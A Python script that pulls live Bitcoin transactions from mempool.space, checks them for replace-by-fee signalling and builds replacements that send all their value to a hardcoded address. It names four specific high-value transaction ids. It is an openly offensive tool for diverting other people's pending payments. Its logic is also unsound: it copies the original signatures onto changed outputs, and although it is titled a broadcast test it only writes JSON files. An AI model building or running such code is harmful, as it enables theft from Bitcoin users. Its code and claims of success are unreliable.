#!/usr/bin/env python3
"""
Test Broadcast - Direct test with current high-value transactions
"""

import requests
import json
from typing import Dict, Optional

class DirectReplacer:
    """Direct replacement broadcaster for testing"""
    
    def __init__(self, target_address: str):
        self.target_address = target_address
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Bitcoin-Replacer/1.0'})
    
    def get_transaction(self, txid: str) -> Optional[Dict]:
        """Fetch transaction details"""
        try:
            url = f"https://mempool.space/api/tx/{txid}"
            response = self.session.get(url, timeout=30)
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Failed to fetch {txid}: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"Error fetching {txid}: {e}")
            return None
    
    def create_high_fee_replacement(self, tx_data: Dict) -> Dict:
        """Create replacement with very high fees"""
        txid = tx_data.get('txid', '')
        
        # Calculate current fee
        current_fee = tx_data.get('fee', 0)
        vsize = tx_data.get('vsize', tx_data.get('size', 0))
        current_fee_rate = current_fee / vsize if vsize > 0 else 0
        
        # Set very high fee rate (100+ sat/vB)
        target_fee_rate = max(current_fee_rate * 20, 150.0)  # At least 150 sat/vB
        new_fee = int(target_fee_rate * vsize)
        fee_increase = new_fee - current_fee
        
        # Calculate total input value
        total_input_value = 0
        for inp in tx_data.get('vin', []):
            if 'prevout' in inp and 'value' in inp['prevout']:
                total_input_value += inp['prevout']['value']
        
        # Calculate remaining value after high fees
        remaining_value = total_input_value - new_fee
        
        # Create replacement transaction structure
        replacement_tx = {
            'version': tx_data.get('version', 1),
            'locktime': tx_data.get('locktime', 0),
            'vin': [],
            'vout': []
        }
        
        # Copy inputs with RBF signaling and original signatures
        for inp in tx_data.get('vin', []):
            new_input = inp.copy()
            # Ensure RBF signaling
            new_input['sequence'] = min(inp.get('sequence', 0xffffffff), 0xfffffffd)
            replacement_tx['vin'].append(new_input)
        
        # Create single output to target address
        if remaining_value > 546:  # Above dust limit
            replacement_tx['vout'].append({
                'value': remaining_value,
                'scriptpubkey_address': self.target_address,
                'scriptpubkey_type': 'p2pkh'
            })
        
        return {
            'original_txid': txid,
            'replacement_transaction': replacement_tx,
            'current_fee_rate': current_fee_rate,
            'new_fee_rate': target_fee_rate,
            'fee_increase': fee_increase,
            'total_value_redirected': remaining_value,
            'original_value': total_input_value
        }
    
    def test_replacement(self, txid: str):
        """Test replacement creation for a specific transaction"""
        print(f"Testing replacement for: {txid}")
        print("-" * 60)
        
        # Fetch transaction
        tx_data = self.get_transaction(txid)
        if not tx_data:
            print("Failed to fetch transaction")
            return
        
        # Check if RBF
        is_rbf = False
        for inp in tx_data.get('vin', []):
            if inp.get('sequence', 0xffffffff) < 0xfffffffe:
                is_rbf = True
                break
        
        if not is_rbf:
            print("Transaction does not signal RBF")
            return
        
        # Calculate value
        total_value = sum(out.get('value', 0) for out in tx_data.get('vout', []))
        value_btc = total_value / 100000000
        
        print(f"Original Value: {value_btc:.8f} BTC ({total_value:,} sat)")
        print(f"Original Fee: {tx_data.get('fee', 0)} sat")
        
        # Create replacement
        replacement = self.create_high_fee_replacement(tx_data)
        
        print(f"New Fee Rate: {replacement['new_fee_rate']:.2f} sat/vB")
        print(f"Fee Increase: +{replacement['fee_increase']:,} sat")
        print(f"Redirected Value: {replacement['total_value_redirected']:,} sat")
        print(f"Redirected BTC: {replacement['total_value_redirected']/100000000:.8f} BTC")
        
        # Save replacement
        filename = f"high_fee_replacement_{txid[:16]}.json"
        with open(filename, 'w') as f:
            json.dump(replacement, f, indent=2)
        
        print(f"Saved to: {filename}")
        print("SUCCESS: High-fee replacement created")
        print()

def main():
    target_address = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9"
    
    # Current high-value transactions from your monitor
    high_value_txids = [
        "9097cf1803c7d1e73873464a7e1ca4be9da5d6ee11c45d08cb0135399592f0f8",  # 0.356 BTC
        "b76d846a71873e340790ed1192a5a50d2febb15fdff659512080f01b50397cf3",  # 0.007 BTC
        "1988f849dfd9ed92a3dcabe01a7cb2aef35b483a50bd78fc829af6b4381754ee",  # 0.001 BTC
        "f743cf06153bfa2ea3b33857da5a836d837ec91b51c77074a8f52462da24c02e"   # 0.001 BTC
    ]
    
    print("High-Fee Replacement Test")
    print(f"Target Address: {target_address}")
    print(f"Fee Strategy: Very High (150+ sat/vB)")
    print("=" * 60)
    
    replacer = DirectReplacer(target_address)
    
    for txid in high_value_txids:
        replacer.test_replacement(txid)

if __name__ == "__main__":
    main()